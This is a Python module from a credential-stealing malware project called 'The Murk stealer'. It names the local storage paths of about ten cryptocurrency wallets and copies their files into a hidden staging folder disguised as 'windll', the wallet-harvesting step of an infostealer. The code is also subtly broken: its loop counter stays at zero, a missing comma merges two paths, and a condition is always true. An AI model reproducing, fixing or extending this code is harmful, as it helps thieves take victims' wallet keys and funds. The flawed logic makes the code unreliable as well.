#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil


def Wallets():
    try:
        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        conter  = 0
        wallets = [
        rf"{pathtofile}\Zcash",
        rf"{pathtofile}\Armory",
        rf"{pathtofile}\bytecoin",
        rf"{pathtofile}\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb",
        rf"{pathtofile}\Exodus\exodus.wallet",
        rf"{pathtofile}\Ethereum\keystore",
        rf"{pathtofile}\Electrum\wallets"
        rf"{pathtofile}\atomic\Local Storage\leveldb",
        rf"{pathtofile}\Guarda\Local Storage\leveldb",
        rf"{pathtofile}\Coinomi\Coinomi\wallets",
        ]
        try:
            for i in range (conter):
                try:
                    if (conter != 3 or conter != 7 or conter != 8):
                        shutil.copytree(wallets[i],rf"{pathtofile}\windll")
                    else:
                        if (conter == 3):
                            shutil.copy2(wallets[i], rf'{pathtofile}\windll\jaxx')
                        if (conter == 7):
                            shutil.copy2(wallets[i], rf'{pathtofile}\windll\atomic')
                        if (conter == 8):
                            shutil.copy2(wallets[i], rf'{pathtofile}\windll\Guarda')
                        
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)
    except:
        pass

